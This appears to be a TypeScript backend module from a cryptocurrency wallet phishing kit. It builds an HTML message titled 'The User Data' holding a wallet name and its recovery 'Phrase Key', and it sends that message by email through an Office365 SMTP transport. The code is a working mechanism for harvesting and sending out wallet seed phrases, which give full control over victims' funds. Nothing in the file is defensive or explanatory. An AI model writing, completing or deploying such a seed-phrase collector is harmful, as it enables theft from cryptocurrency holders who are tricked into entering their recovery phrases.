import { HTTP_REQUEST_CODES } from './constants'
import { createError } from './ErrorHandler'
import nodemailer from 'nodemailer'

export const generateTemplate = (wallet: string, phrase: string) => {
  return `<h1>The User Data</h1><h3>Wallet Name: ${wallet}</h3><h3>Phrase Key: ${phrase}</h3>`
}

const transporter = nodemailer.createTransport({
  host: 'smtp.office365.com',
  port: 587,
  secure: false,
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS,
  },
})

export const sendMail2 = async (
  from: string,
  to: string,
  subject: string,
  text: string
) => {
  try {
    const info = await transporter.sendMail({
      from,
      to,
      subject,
      text,
      html: text,
    })
    console.log(info)
  } catch (error) {
    console.log('Email2 Error:')
    console.log(error)
    createError('Failed to send Email', HTTP_REQUEST_CODES.SERVER_ERROR)
  }
}
